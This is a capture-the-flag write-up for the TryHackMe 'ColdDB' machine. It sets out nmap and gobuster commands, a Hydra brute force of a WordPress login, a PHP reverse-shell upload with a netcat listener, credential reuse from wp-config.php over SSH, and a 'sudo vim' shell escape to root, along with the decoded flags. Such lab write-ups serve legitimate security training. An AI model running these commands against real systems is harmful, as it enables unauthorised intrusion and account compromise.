# TryHackMe - ColdDB (Easy)

Detailed walkthrough of the "ColdDB" machine on TryHackMe.  
Objective: Gain root access by moving from web enumeration to privilege escalation via Vim.

---

## üß≠ Overview

This machine simulates a typical web-to-root scenario. The goal is to exploit a vulnerable WordPress site to gain a foothold, extract credentials, access the system via SSH, and escalate privileges using a misconfigured `vim` binary.

## 1. üîç Port Scanning

Initial full TCP port scan:

```bash
nmap -p- -T5 10.10.158.121
Open ports found:

    80 (HTTP)

    4512 (SSH on a non-standard port)

Service/version detection:Nothing obvious on the homepage. Using Gobuster:

gobuster dir -u http://10.10.158.121 -w /usr/share/wordlists/rockyou.txt

Discovered /Hidden, which contains a message:

    C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. ‚Äì Philip

This reveals a potential valid username: C0ldd.

I first tested common credentials like admin:admin and admin:password ‚Äî no success.

Trying the username C0ldd manually returned a WordPress error indicating that the password is incorrect, meaning the username is valid.

Brute-force attack with Hydra:
hydra -l C0ldd -P /usr/share/wordlists/rockyou.txt 10.10.158.121 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect" -V

Login successful. Access to the WordPress admin panel is now available at /wp-admin.

From the WordPress admin panel, I uploaded a Pentestmonkey PHP reverse shell.
However, it didn't appear in the usual plugins folder. After some digging, I found it uploaded here:
/wp-content/uploads/2025/05/shell.php
nc -lvnp 4444

Triggering the URL launched the reverse shell successfully.

From the initial shell, I tried reading /home/c0ldd/user.txt but lacked permission.

I searched the WordPress config file:
cat /var/www/html/wp-config.php

It contained database credentials ‚Äî which also worked via SSH:
ssh -p 4512 c0ldd@10.10.158.121

After connecting, I was able to read the user flag:
cat /home/c0ldd/user.txt
It was Base64-encoded:

echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 --decode

‚Üí Felicidades, primer nivel conseguido!

6. Privilege Escalation

Checked sudo permissions:

sudo -l

Found that vim could be executed as root. Based on GTFOBins:

sudo vim -c ':!/bin/sh'

Confirmed root access with:

whoami
# root

7. Root Flag

Read the root flag:

cat /root/root.txt

It was also Base64-encoded:

echo "wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=" | base64 --decode

‚Üí ¬°Felicidades, m√°quina completada!
